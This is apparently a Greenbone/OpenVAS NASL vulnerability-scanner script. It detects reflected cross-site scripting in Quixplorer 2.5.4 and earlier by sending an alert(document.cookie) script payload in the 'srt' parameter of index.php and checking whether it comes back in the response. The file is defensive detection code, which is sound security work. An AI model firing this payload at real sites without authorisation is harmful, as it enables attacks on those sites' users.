# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804876");
  script_version("2023-07-26T05:05:09+0000");
  script_cve_id("CVE-2013-1641", "CVE-2013-1642");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_tag(name:"last_modification", value:"2023-07-26 05:05:09 +0000 (Wed, 26 Jul 2023)");
  script_tag(name:"creation_date", value:"2014-11-04 17:05:21 +0530 (Tue, 04 Nov 2014)");
  script_name("Quixplorer Multiple Vulnerabilities - Nov14");

  script_tag(name:"summary", value:"Quixplorer is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request
  and check whether it is able to read cookie or not.");

  script_tag(name:"insight", value:"Multiple errors exist as the input passed
  via the 'dir', 'item', 'order', 'searchitem', 'selitems[]', and 'srt'
  parameters is not validated upon submission to the
  /quixplorer/src/index.php script.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to gain access to arbitrary files and execute arbitrary script code
  in a user's browser within the trust relationship between user's browser and
  the server.");

  script_tag(name:"affected", value:"Quixplorer version 2.5.4 and prior.");

  script_tag(name:"solution", value:"Upgrade to Quixplorer version 2.5.5 or
  later.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");
  script_xref(name:"URL", value:"http://secunia.com/advisories/55725");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/63962");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/63964");
  script_xref(name:"URL", value:"https://www3.trustwave.com/spiderlabs/advisories/TWSL2013-030.txt");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"https://github.com/realtimeprojects/quixplorer");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

http_port = http_get_port(default:80);

if(!http_can_host_php(port:http_port)){
  exit(0);
}

foreach dir (make_list_unique("/", "/quixplorer", "/filemanager", "/filemgr", http_cgi_dirs(port:http_port)))
{

  if(dir == "/") dir = "";

  sndReq = http_get(item:string(dir, "/src/index.php"),  port:http_port);
  rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);

  if(rcvRes && ">Login to use QuiXplorer<" >< rcvRes
            && rcvRes =~ "title.*QuiXplorer Version")
  {
    url = dir + '/src/index.php?action=list&dir=_config&order=n' +
                'ame&srt="><script>alert(document.cookie);</script>';

    ## Send and Confirm the Exploit
    if(http_vuln_check(port:http_port, url:url, check_header:TRUE,
       pattern:"><script>alert\(document.cookie\);</script>",
       extra_check: "QuiXplorer<"))
    {
      security_message(port:http_port);
      exit(0);
    }
  }
}

exit(99);
